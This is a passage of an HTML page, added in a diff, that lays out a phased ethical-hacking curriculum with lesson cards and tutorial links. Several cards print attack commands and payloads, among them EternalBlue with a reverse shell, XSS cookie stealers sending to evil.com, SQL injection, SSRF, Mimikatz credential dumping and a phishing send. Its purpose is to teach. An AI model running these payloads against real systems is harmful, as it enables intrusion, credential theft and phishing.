+<span class="highlight">msf6></span> <span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+<span class="highlight">msf6></span> <span class="cmd">set</span> RHOSTS 192.168.1.10
+<span class="highlight">msf6></span> <span class="cmd">set</span> LHOST 192.168.1.5
+<span class="highlight">msf6></span> <span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="highlight">msf6></span> <span class="cmd">run</span>
+
+<span class="output"># After getting a session:</span>
+<span class="highlight">meterpreter></span> <span class="cmd">sysinfo</span>
+<span class="highlight">meterpreter></span> <span class="cmd">hashdump</span>
+<span class="highlight">meterpreter></span> <span class="cmd">shell</span></code>
+          </div>
+          <ul class="topics">
+            <li>Modules: auxiliary, exploit, payload, post</li>
+            <li>Meterpreter shell commands</li>
+            <li>Privilege escalation post-exploitation</li>
+            <li>Persistence mechanisms</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=8lR27r8Y_ik" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · HackerSploit</div>
+              <div class="yt-title">Metasploit Framework Full Tutorial for Beginners</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Password Attacks -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🔑</span>
+          <div class="card-meta">
+            <div class="card-title">Password Cracking</div>
+            <div class="card-tags">
+              <span class="tag tool">HASHCAT</span>
+              <span class="tag tool">JOHN</span>
+              <span class="tag practice">CRACK</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Break password hashes and bypass authentication using dictionary, brute force, and rule-based attacks.</p>
+          <div class="code-block" data-label="CRACKING">
+<code><span class="comment"># Identify hash type</span>
+<span class="cmd">hash-identifier</span> "5f4dcc3b5aa765d61d8327deb882cf99"
+<span class="output"># → MD5</span>
+
+<span class="comment"># Hashcat dictionary attack</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 0 -a 0</span> hashes.txt rockyou.txt
+<span class="comment"># -m 0 = MD5, -m 1000 = NTLM, -m 1800 = SHA-512</span>
+
+<span class="comment"># John the Ripper</span>
+<span class="cmd">john</span> <span class="flag">--wordlist=</span>rockyou.txt hashes.txt
+<span class="cmd">john</span> <span class="flag">--show</span> hashes.txt
+
+<span class="comment"># Hydra — online brute force SSH</span>
+<span class="cmd">hydra</span> <span class="flag">-l</span> admin <span class="flag">-P</span> rockyou.txt <span class="flag">ssh://</span>192.168.1.10
+<span class="cmd">hydra</span> <span class="flag">-L</span> users.txt <span class="flag">-P</span> passwords.txt <span class="flag">ftp://</span>target.com</code>
+          </div>
+          <ul class="topics">
+            <li>Hash types: MD5, SHA1, NTLM, bcrypt</li>
+            <li>Wordlists: rockyou.txt, SecLists</li>
+            <li>Rainbow tables and salted hashes</li>
+            <li>Credential stuffing attacks</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=7U-RbOKanYs" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · Null Byte</div>
+              <div class="yt-title">Crack Passwords with Hashcat — Beginner's Guide</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Priv Esc -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">⬆️</span>
+          <div class="card-meta">
+            <div class="card-title">Privilege Escalation</div>
+            <div class="card-tags">
+              <span class="tag practice">LINUX</span>
+              <span class="tag practice">WINDOWS</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">After getting a foothold, escalate from a low-privilege user to root/SYSTEM — the holy grail of exploitation.</p>
+          <div class="code-block" data-label="PRIVESC">
+<code><span class="comment"># Linux Privilege Escalation Checklist</span>
+
+<span class="comment"># 1. Check current user & sudo rights</span>
+<span class="cmd">id</span> && <span class="cmd">sudo -l</span>
+
+<span class="comment"># 2. Find SUID binaries (run as root)</span>
+<span class="cmd">find</span> / <span class="flag">-perm -4000 -type f</span> 2>/dev/null
+
+<span class="comment"># 3. Check cron jobs</span>
+<span class="cmd">cat</span> /etc/crontab
+<span class="cmd">ls</span> /etc/cron.*
+
+<span class="comment"># 4. World-writable files</span>
+<span class="cmd">find</span> / <span class="flag">-writable -type f</span> 2>/dev/null
+
+<span class="comment"># 5. Check kernel version for exploits</span>
+<span class="cmd">uname</span> <span class="flag">-a</span>
+<span class="cmd">cat</span> /proc/version
+
+<span class="comment"># Auto-enum scripts</span>
+<span class="cmd">./linpeas.sh</span>     <span class="comment"># Linux</span>
+<span class="cmd">.\winPEAS.exe</span>    <span class="comment"># Windows</span></code>
+          </div>
+          <ul class="topics">
+            <li>SUID/SGID binary exploitation</li>
+            <li>Cron job hijacking</li>
+            <li>Weak file permissions</li>
+            <li>Windows token impersonation</li>
+            <li>Kernel exploits (DirtyCow, etc.)</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=a01HjGMCHsw" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · TCM Security (The Cyber Mentor)</div>
+              <div class="yt-title">Linux Privilege Escalation for Beginners — Full Course</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- PHASE 4: WEB HACKING -->
+  <!-- ════════════════════════════════════ -->
+  <section class="phase" id="phase4">
+    <div class="phase-header">
+      <span class="phase-num advanced">PHASE 04</span>
+      <h2 class="phase-title">Web Application Hacking</h2>
+      <span class="phase-duration">⏱ 8–10 weeks</span>
+    </div>
+    <div class="lessons-grid">
+
+      <!-- Card: SQL Injection -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">💉</span>
+          <div class="card-meta">
+            <div class="card-title">SQL Injection (SQLi)</div>
+            <div class="card-tags">
+              <span class="tag tool">SQLMAP</span>
+              <span class="tag concept">OWASP #3</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Inject malicious SQL queries to dump databases, bypass login, and read files from the server.</p>
+          <div class="code-block" data-label="SQLi">
+<code><span class="comment"># Basic login bypass</span>
+Username: <span class="flag">admin'--</span>
+Password: <span class="flag">anything</span>
+<span class="output"># → Becomes: SELECT * FROM users WHERE user='admin'--'</span>
+
+<span class="comment"># Union-based extraction</span>
+<span class="flag">' UNION SELECT 1,username,password FROM users--</span>
+
+<span class="comment"># Blind SQLi (true/false based)</span>
+<span class="flag">1' AND 1=1--</span>   <span class="comment"># True → returns data</span>
+<span class="flag">1' AND 1=2--</span>   <span class="comment"># False → no data</span>
+
+<span class="comment"># Automated with SQLMap</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://target.com/id=1" <span class="flag">--dbs</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://target.com/id=1" <span class="flag">-D</span> users <span class="flag">--tables</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://target.com/id=1" <span class="flag">--dump</span>
+<span class="cmd">sqlmap</span> <span class="flag">-r</span> request.txt <span class="flag">--level=5 --risk=3</span></code>
+          </div>
+          <ul class="topics">
+            <li>Error-based, Union, Blind, Time-based SQLi</li>
+            <li>Reading/writing files via LOAD_FILE()</li>
+            <li>Bypassing WAFs</li>
+            <li>Prevention: parameterized queries</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=ciNHn38EyRc" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · Computerphile</div>
+              <div class="yt-title">SQL Injection — How it Works & How to Prevent It</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: XSS -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🕸️</span>
+          <div class="card-meta">
+            <div class="card-title">Cross-Site Scripting (XSS)</div>
+            <div class="card-tags">
+              <span class="tag concept">OWASP #7</span>
+              <span class="tag tool">BURPSUITE</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Inject JavaScript into web pages to steal cookies, hijack sessions, and deface websites.</p>
+          <div class="code-block" data-label="XSS">
+<code><span class="comment"># Reflected XSS test payload</span>
+<span class="flag">&lt;script>alert('XSS')&lt;/script></span>
+
+<span class="comment"># Cookie stealer payload</span>
+<span class="flag">&lt;script>document.location='http://evil.com/steal?c='+document.cookie&lt;/script></span>
+
+<span class="comment"># Stored XSS (in comment/profile field)</span>
+<span class="flag">&lt;img src=x onerror="fetch('//evil.com/?c='+btoa(document.cookie))"&gt;</span>
+
+<span class="comment"># Bypass filters</span>
+<span class="flag">&lt;ScRiPt>alert(1)&lt;/sCrIpT></span>   <span class="comment"># Case bypass</span>
+<span class="flag">&lt;svg/onload=alert(1)></span>         <span class="comment"># Event bypass</span>
+<span class="flag">javascript:alert(1)</span>              <span class="comment"># In href attr</span>
+
+<span class="comment"># Set up listener</span>
+<span class="cmd">nc</span> <span class="flag">-lvnp</span> 8080  <span class="comment"># Catch stolen cookies</span></code>
+          </div>
+          <ul class="topics">
+            <li>Reflected vs Stored vs DOM-based XSS</li>
+            <li>Session hijacking via cookie theft</li>
+            <li>BeEF Framework for XSS exploitation</li>
+            <li>Content Security Policy (CSP) bypass</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=EoaDgUgS6QA" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · Computerphile</div>
+              <div class="yt-title">Cross-Site Scripting (XSS) Explained</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Burp Suite -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🔬</span>
+          <div class="card-meta">
+            <div class="card-title">Burp Suite — Web Proxy</div>
+            <div class="card-tags">
+              <span class="tag tool">BURPSUITE</span>
+              <span class="tag practice">INTERCEPT</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Intercept, modify, and replay HTTP requests. The essential tool for every web penetration tester.</p>
+          <div class="code-block" data-label="BURP">
+<code><span class="comment"># Burp Suite Workflow:</span>
+<span class="output">1. Set browser proxy → 127.0.0.1:8080</span>
+<span class="output">2. Install Burp CA certificate in browser</span>
+<span class="output">3. Browse target site → Burp intercepts</span>
+
+<span class="comment"># Key Modules:</span>
+<span class="highlight">Proxy</span>    → Intercept & modify requests
+<span class="highlight">Repeater</span> → Replay requests manually
+<span class="highlight">Intruder</span> → Automated fuzzing/brute force
+<span class="highlight">Scanner</span>  → Auto vuln detection (Pro)
+<span class="highlight">Decoder</span>  → Encode/decode Base64, URL, etc.
+
+<span class="comment"># Intruder attack types:</span>
+<span class="flag">Sniper</span>   → One payload at a time
+<span class="flag">Pitchfork</span> → Multiple lists, parallel
+<span class="flag">ClusterBomb</span> → All combinations</code>
+          </div>
+          <ul class="topics">
+            <li>Intercepting HTTPS traffic</li>
+            <li>Parameter tampering</li>
+            <li>Fuzzing for hidden endpoints</li>
+            <li>IDOR (Insecure Direct Object Reference)</li>
+            <li>Authentication bypass testing</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=G3hpAeoZ4ek" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · HackerSploit</div>
+              <div class="yt-title">Burp Suite for Beginners — Complete Tutorial</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: More Web Attacks -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🌐</span>
+          <div class="card-meta">
+            <div class="card-title">CSRF, SSRF & Directory Traversal</div>
+            <div class="card-tags">
+              <span class="tag concept">OWASP TOP 10</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Deep dive into server-side vulnerabilities that allow reading internal files and forcing user actions.</p>
+          <div class="code-block" data-label="WEB ATTACKS">
+<code><span class="comment"># Directory Traversal — read /etc/passwd</span>
+<span class="flag">http://target.com/page?file=../../../../etc/passwd</span>
+<span class="flag">http://target.com/page?file=....//....//etc/passwd</span>
+
+<span class="comment"># SSRF — Server-Side Request Forgery</span>
+<span class="flag">http://target.com/fetch?url=http://127.0.0.1/admin</span>
+<span class="flag">http://target.com/fetch?url=http://169.254.169.254/</span>
+<span class="output"># → AWS metadata endpoint leak!</span>
+
+<span class="comment"># CSRF PoC form</span>
+<span class="flag">&lt;form action="http://bank.com/transfer" method="POST">
+  &lt;input name="amount" value="1000">
+  &lt;input name="to" value="attacker">
+&lt;/form>
+&lt;script>document.forms[0].submit()&lt;/script></span></code>
+          </div>
+          <ul class="topics">
+            <li>Path traversal & LFI/RFI</li>
+            <li>SSRF to access cloud metadata</li>
+            <li>CSRF token bypass techniques</li>
+            <li>XXE (XML External Entity) injection</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=eWEgUcHPle0" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · PortSwigger (Web Security Academy)</div>
+              <div class="yt-title">SSRF Attacks Explained — Server-Side Request Forgery</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- PHASE 5: ADVANCED TOPICS -->
+  <!-- ════════════════════════════════════ -->
+  <section class="phase" id="phase5">
+    <div class="phase-header">
+      <span class="phase-num advanced">PHASE 05</span>
+      <h2 class="phase-title">Advanced Exploitation</h2>
+      <span class="phase-duration">⏱ 8–12 weeks</span>
+    </div>
+    <div class="lessons-grid">
+
+      <!-- Card: Buffer Overflow -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">💾</span>
+          <div class="card-meta">
+            <div class="card-title">Buffer Overflow</div>
+            <div class="card-tags">
+              <span class="tag concept">BINARY EXPLOIT</span>
+              <span class="tag practice">BOF</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Overflow memory buffers to overwrite the return address and redirect code execution to your shellcode.</p>
+          <div class="code-block" data-label="BOF">
+<code><span class="comment"># Step 1: Find crash offset with pattern</span>
+<span class="cmd">msf-pattern_create</span> <span class="flag">-l</span> 2000
+<span class="comment"># Crash the app, note EIP value</span>
+<span class="cmd">msf-pattern_offset</span> <span class="flag">-l</span> 2000 <span class="flag">-q</span> 386F4337
+<span class="output"># [*] Exact match at offset 1978</span>
+
+<span class="comment"># Step 2: Control EIP</span>
+<span class="highlight">payload</span> = <span class="flag">"A"</span> * 1978 + <span class="flag">"BBBB"</span>
+<span class="comment"># → EIP = 42424242 (our B's)</span>
+
+<span class="comment"># Step 3: Find bad chars, JMP ESP</span>
+<span class="cmd">!mona</span> jmp <span class="flag">-r esp</span>
+
+<span class="comment"># Step 4: Generate shellcode</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p windows/shell_reverse_tcp</span>
+  <span class="flag">LHOST=192.168.1.5 LPORT=4444</span>
+  <span class="flag">-b "\x00\x0a\x0d" -f python</span></code>
+          </div>
+          <ul class="topics">
+            <li>Stack vs Heap overflow</li>
+            <li>Finding EIP offset (pattern_create)</li>
+            <li>Bad character identification</li>
+            <li>Bypassing ASLR, DEP, stack canaries</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=1S0aBV-Waeo" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · TCM Security (The Cyber Mentor)</div>
+              <div class="yt-title">Buffer Overflow Attack — Explained Step by Step</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Active Directory -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🏢</span>
+          <div class="card-meta">
+            <div class="card-title">Active Directory Attacks</div>
+            <div class="card-tags">
+              <span class="tag tool">BLOODHOUND</span>
+              <span class="tag tool">MIMIKATZ</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">AD is used in 90% of enterprises. Mastering AD attacks is crucial for any red teamer or pentester.</p>
+          <div class="code-block" data-label="ACTIVE DIRECTORY">
+<code><span class="comment"># Enumerate domain with BloodHound</span>
+<span class="cmd">SharpHound.exe</span> <span class="flag">-c All</span>
+<span class="comment"># Import .zip into BloodHound GUI</span>
+<span class="comment"># → Find paths to Domain Admin</span>
+
+<span class="comment"># Kerberoasting — request service tickets</span>
+<span class="cmd">GetUserSPNs.py</span> domain/user:pass <span class="flag">-request</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 13100</span> kerb_hashes.txt rockyou.txt
+
+<span class="comment"># Pass the Hash</span>
+<span class="cmd">pth-winexe</span> <span class="flag">-U domain/admin%</span>LM:NTLM //target cmd
+
+<span class="comment"># Dump credentials with Mimikatz</span>
+<span class="highlight">mimikatz#</span> privilege::debug
+<span class="highlight">mimikatz#</span> sekurlsa::logonpasswords
+<span class="highlight">mimikatz#</span> lsadump::dcsync <span class="flag">/user:krbtgt</span></code>
+          </div>
+          <ul class="topics">
+            <li>Domain enumeration (ldapdomaindump, enum4linux)</li>
+            <li>Kerberoasting & AS-REP Roasting</li>
+            <li>Pass-the-Hash / Pass-the-Ticket</li>
+            <li>DCSync & Golden Ticket attacks</li>
+            <li>BloodHound attack path analysis</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=pKtDQtsubio" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · TCM Security (The Cyber Mentor)</div>
+              <div class="yt-title">Active Directory Attacks — Practical Ethical Hacking</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Social Engineering -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🎭</span>
+          <div class="card-meta">
+            <div class="card-title">Social Engineering & Phishing</div>
+            <div class="card-tags">
+              <span class="tag tool">SET</span>
+              <span class="tag concept">OSINT</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">The weakest link is always the human. Use OSINT and phishing to bypass technical defenses entirely.</p>
+          <div class="code-block" data-label="SOCIAL ENG">
+<code><span class="comment"># OSINT — gather intel before attacking</span>
+<span class="cmd">theHarvester</span> <span class="flag">-d</span> target.com <span class="flag">-b</span> google
+<span class="cmd">whois</span> target.com
+<span class="cmd">shodan</span> search "org:TargetCompany"
+
+<span class="comment"># Social Engineer Toolkit (SET)</span>
+<span class="cmd">sudo setoolkit</span>
+<span class="output">> 1) Social-Engineering Attacks</span>
+<span class="output">> 2) Website Attack Vectors</span>
+<span class="output">> 3) Credential Harvester Attack</span>
+<span class="output">> 2) Site Cloner</span>
+<span class="output">Enter URL to clone: https://target.com/login</span>
+
+<span class="comment"># Phishing email sender</span>
+<span class="cmd">swaks</span> <span class="flag">--to</span> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0b7d62687f62664b7f6a796c6e7f25686466">[email&#160;protected]</a>
+  <span class="flag">--from</span> "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="eca5b8c1bf999c9c839e98ac988d9e8b8998c28f8381">[email&#160;protected]</a>"
+  <span class="flag">--body</span> "Reset your password: evil.link"</code>
+          </div>
+          <ul class="topics">
+            <li>OSINT: LinkedIn, Shodan, Google dorks</li>
+            <li>Spear phishing vs mass phishing</li>
+            <li>Pretexting and vishing</li>
+            <li>Cloning login pages for creds</li>
+            <li>GoPhish framework for campaigns</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=js_JCmoEMRM" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · NetworkChuck</div>
+              <div class="yt-title">Phishing Attack Demo — Social Engineering Explained</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- PHASE 6: EXPERT -->
+  <!-- ════════════════════════════════════ -->
+  <section class="phase" id="phase6">
+    <div class="phase-header">
+      <span class="phase-num expert">PHASE 06</span>
+      <h2 class="phase-title">Expert — Red Teaming & CTF</h2>
+      <span class="phase-duration">⏱ 3–6 months</span>
+    </div>
+    <div class="lessons-grid">
+
+      <!-- Card: Wireless -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">📶</span>
+          <div class="card-meta">
+            <div class="card-title">Wireless Network Attacks</div>
+            <div class="card-tags">
+              <span class="tag tool">AIRCRACK-NG</span>
+              <span class="tag practice">WIFI</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Crack WPA2 passwords, capture handshakes, and perform evil twin attacks on wireless networks.</p>
+          <div class="code-block" data-label="WIRELESS">
+<code><span class="comment"># Enable monitor mode</span>
+<span class="cmd">airmon-ng start</span> wlan0
+<span class="output"># Interface becomes wlan0mon</span>
+
+<span class="comment"># Scan for networks</span>
+<span class="cmd">airodump-ng</span> wlan0mon
+
+<span class="comment"># Target specific AP & capture handshake</span>
+<span class="cmd">airodump-ng</span> <span class="flag">-c 6 --bssid</span> AA:BB:CC:DD:EE:FF
+  <span class="flag">-w</span> capture wlan0mon
+
+<span class="comment"># Deauth attack to force handshake</span>
+<span class="cmd">aireplay-ng</span> <span class="flag">--deauth 10 -a</span> AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="comment"># Crack WPA2 with wordlist</span>
+<span class="cmd">aircrack-ng</span> <span class="flag">-w</span> rockyou.txt <span class="flag">-b</span> AA:BB:CC:DD:EE:FF capture*.cap
+
+<span class="comment"># Evil Twin AP (create fake hotspot)</span>
+<span class="cmd">hostapd-wpe</span> hostapd.conf</code>
+          </div>
+          <ul class="topics">
+            <li>WEP cracking (deprecated but educational)</li>
+            <li>WPA/WPA2 PMKID attack</li>
+            <li>WPS PIN brute force (Reaver)</li>
+            <li>Rogue AP / Evil Twin attacks</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=WfYxrLaqlN8" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · Null Byte</div>
+              <div class="yt-title">Crack WPA2 WiFi Password with Aircrack-ng</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Reverse Engineering -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🔩</span>
+          <div class="card-meta">
+            <div class="card-title">Reverse Engineering & Malware Analysis</div>
+            <div class="card-tags">
+              <span class="tag tool">GHIDRA</span>
+              <span class="tag tool">RADARE2</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Analyze malware, CTF binaries, and proprietary software without source code.</p>
+          <div class="code-block" data-label="REVERSE ENG">
+<code><span class="comment"># Static analysis (no execution)</span>
+<span class="cmd">file</span> suspicious_binary
+<span class="cmd">strings</span> <span class="flag">-n 8</span> suspicious_binary | <span class="cmd">grep</span> -i "http\|pass"
+<span class="cmd">objdump</span> <span class="flag">-d</span> binary | head <span class="flag">-50</span>
+
+<span class="comment"># Dynamic analysis (with strace/ltrace)</span>
+<span class="cmd">strace</span> ./binary  <span class="comment"># Trace system calls</span>
+<span class="cmd">ltrace</span> ./binary  <span class="comment"># Trace library calls</span>
+
+<span class="comment"># GDB — GNU Debugger</span>
+<span class="cmd">gdb</span> ./binary
+<span class="highlight">gdb></span> disassemble main
+<span class="highlight">gdb></span> break *0x08048456
+<span class="highlight">gdb></span> run
+<span class="highlight">gdb></span> info registers
+
+<span class="comment"># Ghidra: GUI reverse engineering</span>
+<span class="output"># Open binary → decompile to C-like code</span></code>
+          </div>
+          <ul class="topics">
+            <li>x86/x64 assembly basics</li>
+            <li>Static vs dynamic analysis</li>
+            <li>Ghidra & IDA Pro for decompilation</li>
+            <li>Sandbox analysis (Cuckoo)</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=d4Pgi5XML8E" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · LiveOverflow</div>
+              <div class="yt-title">Intro to Reverse Engineering & Binary Exploitation</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: CTF Tips -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🏁</span>
+          <div class="card-meta">
+            <div class="card-title">CTF Competitions & Practice</div>
+            <div class="card-tags">
+              <span class="tag practice">CTF</span>
+              <span class="tag concept">COMPETE</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">CTFs (Capture The Flag) are the best way to sharpen skills in a legal, competitive environment.</p>
+          <div class="code-block" data-label="CTF TOOLS">
+<code><span class="comment"># Forensics / Steganography</span>
+<span class="cmd">binwalk</span> image.png      <span class="comment"># Find hidden files</span>
+<span class="cmd">steghide extract</span> <span class="flag">-sf</span> image.jpg
+<span class="cmd">exiftool</span> photo.jpg    <span class="comment"># EXIF metadata</span>
+
+<span class="comment"># Cryptography</span>
+<span class="cmd">echo</span> "aGVsbG8=" | <span class="cmd">base64 -d</span>  <span class="comment"># Decode b64</span>
+<span class="cmd">python3</span> <span class="flag">-c</span> "import codecs; print(codecs.decode('uryyb', 'rot13'))"
+
+<span class="comment"># Web CTF</span>
+<span class="cmd">gobuster dir</span> <span class="flag">-u</span> http://target <span class="flag">-w</span> dirbuster.txt
+<span class="cmd">ffuf</span> <span class="flag">-w</span> wordlist.txt <span class="flag">-u</span> http://target/FUZZ
+
+<span class="comment"># Recommended CTF platforms:</span>
+<span class="output"># → HackTheBox.com  (realistic machines)</span>
+<span class="output"># → TryHackMe.com   (guided learning paths)</span>
+<span class="output"># → PicoCTF.com     (great for beginners)</span>
+<span class="output"># → CTFtime.org     (competition calendar)</span></code>
+          </div>
+          <ul class="topics">
+            <li>CTF categories: Web, Pwn, Crypto, Forensics, Rev, OSINT</li>
+            <li>HackTheBox & TryHackMe machines</li>
+            <li>CTFtime.org for competitions</li>
+            <li>Build a CTF toolkit (pwntools, pycryptodome)</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=Lus7aNf2xDg" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · John Hammond</div>
+              <div class="yt-title">How to Get Started with CTF Competitions</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- CERTIFICATIONS -->
+  <!-- ════════════════════════════════════ -->
+  <section class="phase" id="phase6">
+    <div class="phase-header">
+      <span class="phase-num elite">CERTS</span>
+      <h2 class="phase-title">Certifications Roadmap</h2>
+      <span class="phase-duration">⏱ Ongoing</span>
+    </div>
+    <div class="lessons-grid">
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🥉</span>
+          <div class="card-meta">
+            <div class="card-title">Entry Level</div>
+            <div class="card-tags"><span class="tag concept">START HERE</span></div>
+          </div>
+        </div>
+        <div class="card-body">
+          <ul class="topics">
+            <li><strong style="color:#fff">CompTIA Security+</strong> — Security fundamentals baseline</li>
+            <li><strong style="color:#fff">eJPT</strong> (eLearnSecurity Junior Penetration Tester)</li>
+            <li><strong style="color:#fff">CompTIA Network+</strong> — Strong networking foundation</li>
+          </ul>
+          <div class="code-block" data-label="DIFFICULTY">
+<code><span class="output">Security+  → ██████░░░░ Medium  (~3 months study)</span>
+<span class="output">eJPT       → ████░░░░░░ Easy    (~2 months study)</span></code>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🥈</span>
+          <div class="card-meta">
+            <div class="card-title">Intermediate</div>
+            <div class="card-tags"><span class="tag tool">INDUSTRY STANDARD</span></div>
+          </div>
+        </div>
+        <div class="card-body">
+          <ul class="topics">
+            <li><strong style="color:#fff">CEH</strong> — Certified Ethical Hacker (EC-Council)</li>
+            <li><strong style="color:#fff">PNPT</strong> — Practical Network Penetration Tester</li>
+            <li><strong style="color:#fff">eWPT</strong> — Web Application Penetration Tester</li>
+          </ul>
+          <div class="code-block" data-label="DIFFICULTY">
+<code><span class="output">CEH  → ████████░░ Hard   (~6 months study)</span>
+<span class="output">PNPT → ██████░░░░ Medium (~4 months study)</span></code>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🏆</span>
+          <div class="card-meta">
+            <div class="card-title">Elite / Gold Standard</div>
+            <div class="card-tags"><span class="tag practice">MOST RESPECTED</span></div>
+          </div>
+        </div>
+        <div class="card-body">
+          <ul class="topics">
+            <li><strong style="color:#fff">OSCP</strong> — Offensive Security Certified Professional</li>
+            <li><strong style="color:#fff">CRTO</strong> — Certified Red Team Operator</li>
+            <li><strong style="color:#fff">OSED / OSEP</strong> — Advanced Offensive Security certs</li>
+          </ul>
+          <div class="code-block" data-label="DIFFICULTY">
+<code><span class="output">OSCP → ██████████ Extreme (~12 months)</span>
+<span class="output">       Requires: 24-hr hands-on exam!</span>
+<span class="output">CRTO → █████████░ Very Hard (~8 months)</span></code>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- TOOLS SECTION -->
+  <!-- ════════════════════════════════════ -->
+  <div class="tools-section" id="tools">
+    <h2 class="section-title">🛠 Essential Hacker Toolkit</h2>
+    <div class="tools-grid">
